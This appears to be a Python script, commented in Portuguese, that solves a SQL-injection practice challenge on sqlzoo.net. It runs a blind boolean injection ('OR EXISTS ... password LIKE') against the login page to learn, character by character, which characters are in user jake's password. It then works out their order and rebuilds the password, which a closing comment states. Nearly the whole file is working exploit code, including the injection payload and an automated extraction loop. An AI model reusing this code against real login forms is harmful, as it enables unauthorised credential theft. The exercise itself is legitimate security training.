#!env/bin/python3

import requests
from bs4 import BeautifulSoup 
from itertools import chain
from util import Stack
from random import shuffle
import logging

nivel = logging.WARNING #logging.WARNING
formato = ' %(asctime)s - %(levelname)s - %(message)s'
formato = ' %(message)s'
logging.basicConfig(level = nivel, format = formato)


URL = "http://sqlzoo.net/hack/passwd.pl"

trueQuery = "' OR ''='"


def makeQuestionAboutPassword(query :str, user="jake" ) -> dict:
    assert(type(user)==str)
    assert(type(query)==str)
    statement = "' OR EXISTS(SELECT * FROM users WHERE name='{}' AND password LIKE '{}') AND ''='"
    senha = statement.format(user, query)
    pwd = {"name":"xxxNOxxx", "password":senha}
    return pwd


def conectaComUsuarioESenha(nome : str, senha : str) -> bool:
    assert(type(nome)==str)
    assert(type(senha)==str)
    parametros = {"name": nome, "password": senha}
    resultado = requests.get(URL, params=parametros)
    logging.info("Sucesso") if "Welcome" in resultado.text else print("Fracasso")
    return "Welcome" in resultado.text


def conectaComParametros(parametros)->bool:
    assert(type(parametros)==dict)
    logging.info("Username: %s\nSenha: %s\n" %(parametros["name"], parametros["password"]))
    resultado = requests.get(URL, params=parametros)
    logging.info("Conectando a: %s\n" % resultado.url)
    logging.info("Sucesso") if "Welcome" in resultado.text else logging.info("Fracasso")
    return "Welcome" in resultado.text


def obtemLetrasDaSenha(user="jake"):
    assert(type(user)==str)
    resposta = ""

    intervaloSimbolos = chain(range(32,48),range(58,65),range(91,97), range(123, 127))
    intervaloNumeros = range(48,58)
    intervaloLetras = range(65,91)
    intervaloTodos = chain(intervaloSimbolos, intervaloLetras, intervaloNumeros)

    for code in intervaloTodos:
        if chr(code)=="%" or chr(code)=="_":
            logging.info("Pulando % ou _")
            continue # Pula o codigo. Esses são caracteres coringa no SQL.
        encontrado = conectaComParametros(makeQuestionAboutPassword("%"+chr(code)+"%", user))
        logging.warning("Analisando "+chr(code))
        if encontrado:
            resposta += (chr(code))
            logging.info("A senha contém: %s\n" %(resposta))
    logging.info("A senha contém: %s\n" %(resposta))

    assert(type(resposta)==str)
    return resposta


def obtemOrdemDoisADois(letras): #letras = list(tupla(str))
    assert(type(letras)==str)
    resposta = ""
    tuplas = []
    for code1 in letras:
        logging.warning("%s:" %code1)
        for code2 in letras:
            logging.warning("   %s" %code2)
            ordem = conectaComParametros(makeQuestionAboutPassword("%"+code1+code2+"%"))
            if(ordem):
                logging.info("%s vem antes de %s." %(code1, code2))
                resposta += code1+" vem antes de "+code2+"\n"
                tuplas = tuplas + [(code1, code2)]
    print("Pares de letras: \n%s" %resposta)

    assert(type(tuplas)==list)
    # Na verdade é um list(tuplas): [(a,b), (c,d),(e,f)...]
    return tuplas


def obtemSenhaAPartirDeLetrasOrdenadas(listaTuplas):
    assert(type(listaTuplas)==list)
    tamanhoDaSenha = len(listaTuplas)+1

    inicio = None
    fim = None
    senha = None
    tuplasRestantes = listaTuplas.copy()
    senhasPossiveis = Stack() #util.Stack()
    senhasIncorretas = []

    
    # Preparacao:
    startState = (None, tuplasRestantes)
    senhasPossiveis.push(startState)

    logging.info("Start State: %s" % (startState,))

    while True: #len(tuplasRestantes) > 0:
        if senhasPossiveis.isEmpty():
            logging.warning("Senhas Possiveis vazia. Retornando None.")
            senha= None
            break

        pwd, tuplasRestantes = senhasPossiveis.pop()
        logging.info("Analisando %s. Restante %s\n" %(pwd, tuplasRestantes))
        if(senhaEncontrada(tamanhoDaSenha, pwd, tuplasRestantes)):
            senha = pwd
            logging.info("Senha encontrada: %s" %pwd)
            break

        logging.info("Senha não encontrada.\n" )
        if pwd not in senhasIncorretas:
            senhasIncorretas = senhasIncorretas + [pwd]
            for sucessor in proximos(pwd, tuplasRestantes):
                newRestantes = tuplasRestantes.copy()
                newRestantes.remove(sucessor)
                if(pwd):
                    newPalavra = str(pwd)+str(sucessor[1])
                    
                else: # Se pwd=None
                    newPalavra = "".join(sucessor)

                newState = (newPalavra, newRestantes)
                logging.info("Adicionando possivel senha à pilha: %s" %(newState,))
                senhasPossiveis.push(newState)


    logging.info("A senha é %s" %senha)
    assert(type(senha)==str)
    return senha

def senhaEncontrada(tamanhoEsperado:int, senhaObtida:str, restantes)->bool:
    assert(type(tamanhoEsperado)==int)
    if senhaObtida==None:
        encontrada = False
    else:
        assert(type(senhaObtida)==str)
        #assert(type(restante)==list[tuples])

        logging.info("Obtida: %s, Restante: %s", senhaObtida, restantes)
        encontrada = len(restantes)==0 and len(senhaObtida)==tamanhoEsperado
        logging.info("Senha encontrada? %s" %encontrada)

    assert(type(encontrada)==bool)
    return encontrada
    


def proximos(palavra, listaTuplas):
    if(palavra == None):
        assert(type(listaTuplas)==list)
        proximos = listaTuplas.copy()
    else:
        assert(type(palavra)==str)
        assert(type(listaTuplas)==list)

        ultimaLetra = palavra[-1:]
        logging.info("Obtendo proximo de %s [%s]." % (palavra, ultimaLetra))
        proximos = [t for t in listaTuplas if ultimaLetra==t[0] ]
        logging.info(proximos)

    assert(type(proximos)==list)
    return proximos


def senhaParaListaDeTuplas(senha):
    assert(type(senha)==str)
    tamanho = len(senha)
    lista = []
    for i in range (tamanho-1):
        tupla = (senha[i], senha[i+1])
        lista = lista + [tupla]
    shuffle(lista)
    
    assert(type(lista)==list)
    return lista
            

#1 Descobrimos quais letras estão na senha:
letrasDoJake = obtemLetrasDaSenha("jake");
letrasOrdenadas = obtemOrdemDoisADois(letrasDoJake);
senhaDoJake = obtemSenhaAPartirDeLetrasOrdenadas(letrasOrdenadas)
print("A senha de Jake é: %s." %senhaDoJake);

# PlayTests
# listaSenha = [ ('L', 'W'), ('E', 'L'),('O', 'D'), ('O', 'O'), ('W', 'O')]
# print(obtemSenhaAPartirDeLetrasOrdenadas(listaSenha))

# senhasTeste = ["ola", "magali", "porta", "portao", "prato", "parto"]
# ltSenhas = [senhaParaListaDeTuplas(x) for x in senhasTeste]
# senhasObtidas = [obtemSenhaAPartirDeLetrasOrdenadas(senha) for senha in ltSenhas]

# sucesso = [x==y for x, y in zip(senhasTeste, senhasObtidas)]

# for i in range (len(senhasTeste)):
#     print("Teste: %s" %senhasTeste[i])
#     print("Lista de Tuplas: %s" %ltSenhas[i])
#     print("Lista Interpretada: %s" %senhasObtidas[i])
#     print("\n")

# Senha jake = elwood